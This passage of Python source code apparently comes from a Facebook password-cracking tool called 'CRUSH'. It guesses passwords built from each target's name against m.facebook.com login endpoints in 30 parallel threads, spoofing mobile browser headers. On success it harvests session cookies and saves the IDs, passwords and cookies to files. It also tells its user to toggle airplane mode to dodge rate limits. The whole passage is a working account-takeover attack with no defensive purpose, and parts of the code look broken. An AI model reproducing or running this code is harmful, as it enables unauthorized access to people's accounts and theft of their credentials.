                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = randBuildvsskj()
                getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116"Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36; [FBAN/FB4A;FBAV/291.0.0.8.142;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CRUSHb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CRUSHb};{ckkk}"
                    print(f'\033[1;33m [COOKIE-🍪] :\033[1;33m '+cookie)
                    print(f"\r{R} [CRUSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/CRUSH_OK_IDS_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CRUSH_IDS_COOKIES_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'|'+joined(ids)+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{A} [CRUSH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CRUSH_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except Exception as err:print(err)
        except requests.exceptions.ConnectionError:
             self.methodB(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print(f'{RED} [{GREEN}✔️{RED}] {GREEN}Put limit Unlimited')
            sl = int(input(f'{RED} [{GREEN1}✔️{RED}] {GREEN1}Password Limit→'))
            os.system("clear")
            print(logo)
            print(f'{RED} [{GREEN1}✔️{RED}] {GREEN1}\033[1;32m[Example: first123,last1122,firstlast,last,name,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between Unlimited')
            elif sl > 99:
                print('\nPassword are no Limit')
            else:
                for sr in range(sl):
                    pw.append(input(f'{RED} [{GREEN}{RED}] {GREEN}PASSWORD {sr+1} > '))
            os.system("clear")
            print(logo)
            
            print(f"{RED} [{GREEN}✔️{RED}] {GREEN}USE AIRPLANE MODE AFTER 5 MINUTES {S}")
            print("\033[1;32m-----------------------------------------------------")
            print(f'{RED} [{GREEN1}✔️{RED}] {GREEN1}\033[1;34mTOTAL ACCOUNT IDS >> %s ' % len(self.id))
            print(f'{RED} [{GREEN2}✔️{RED}] {GREEN2}\033[1;35mCRACKING STARTED >>')
            print("-----------------------------------------------------")
            with mogidDANGER(max_workers=30) as CRUSHworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                CRUSHworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodC' in methods:
                                CRUSHworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                CRUSHworld.submit(self.methodD, uid, name, pwx)
                            elif 'methodB' in methods:
                                CRUSHworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            


CRUSH()'))
